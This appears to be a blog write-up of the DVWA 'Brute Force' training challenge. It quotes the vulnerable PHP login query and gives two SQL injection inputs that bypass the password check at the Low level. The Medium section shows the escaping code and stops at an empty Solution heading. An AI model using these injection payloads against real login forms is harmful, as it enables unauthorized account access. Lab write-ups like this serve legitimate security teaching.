---
layout: post
title: "Brute Force"
date: 2020-07-03T22:26:03+08:00
---

Brute Force Challenges of DVWA.

## Low

### Code

```
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

No filter of user inputs, we can have two ways to bypass the password check.

### Solution

If we know the user name, we can fill in `admin' or '1' = '1`.

```
    $query  = "SELECT * FROM `users` WHERE user = 'admin' or '1'='1' AND password = '$pass';";
```

If we do not know the user name, we can fill in `x' or 1 = 1 limit 1 #`.

```
    $query  = "SELECT * FROM `users` WHERE user = 'xxx' or 1 = 1 limit 1 #' AND password = '$pass';";
```

## Medium

### Code

```
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

### Solution

